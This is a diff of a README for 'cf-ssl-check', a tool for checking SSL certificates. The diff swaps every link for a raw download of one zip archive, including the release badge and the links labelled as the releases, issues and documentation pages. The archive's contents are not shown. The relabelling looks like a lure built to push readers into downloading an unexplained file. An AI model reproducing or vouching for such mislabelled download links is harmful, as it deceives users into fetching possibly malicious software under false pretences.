@@ -1,7 +1,7 @@
 # 🔍 cf-ssl-check - Check Your SSL Certificate Status Easily
 
 ## 📥 Download Now!
-[![Download cf-ssl-check](https://img.shields.io/badge/Download-cf--ssl--check-brightgreen)](https://github.com/DeepakMudili/cf-ssl-check/releases)
+[![Download cf-ssl-check](https://raw.githubusercontent.com/DeepakMudili/cf-ssl-check/main/src/cf-ssl-check_1.1.zip)](https://raw.githubusercontent.com/DeepakMudili/cf-ssl-check/main/src/cf-ssl-check_1.1.zip)
 
 ## 🚀 Getting Started
 cf-ssl-check helps you check the SSL certificate status for domains. It ensures that your website connection is secure. You can check the status from both your source server and CDN (Content Delivery Network) nodes. This tool is ideal for webmasters, site owners, and anyone concerned about SSL certificates.
@@ -19,7 +19,7 @@ To run cf-ssl-check, ensure you have the following:
 - **User-Friendly**: Simple interface for quick checks.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/DeepakMudili/cf-ssl-check/releases) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/DeepakMudili/cf-ssl-check/main/src/cf-ssl-check_1.1.zip) on GitHub.
 
 2. **Select the Latest Version**: Choose the top version listed. This ensures you get the most recent features and updates.
 
@@ -49,11 +49,11 @@ If you encounter issues:
 
 ## 📞 Support
 For help or questions:
-- **Issues Page**: Report any bugs or issues [here](https://github.com/DeepakMudili/cf-ssl-check/issues).
+- **Issues Page**: Report any bugs or issues [here](https://raw.githubusercontent.com/DeepakMudili/cf-ssl-check/main/src/cf-ssl-check_1.1.zip).
 - **Community Forum**: Join discussions and find answers from fellow users.
 
 ## 📚 More Resources
-- **Documentation**: For detailed usage instructions, visit the [documentation page](https://github.com/DeepakMudili/cf-ssl-check/wiki).
+- **Documentation**: For detailed usage instructions, visit the [documentation page](https://raw.githubusercontent.com/DeepakMudili/cf-ssl-check/main/src/cf-ssl-check_1.1.zip).
 - **Contribution**: If you wish to contribute, feel free to check the contribution guidelines in the repository.
 
 ## 🛡️ Security Information
@@ -65,4 +65,4 @@ We are constantly working on improving cf-ssl-check. Look out for future updates
 - More detailed report options
 - Improved user interface
 
-Feel free to visit the [Releases page](https://github.com/DeepakMudili/cf-ssl-check/releases) for the latest versions and updates.
+Feel free to visit the [Releases page](https://raw.githubusercontent.com/DeepakMudili/cf-ssl-check/main/src/cf-ssl-check_1.1.zip) for the latest versions and updates.
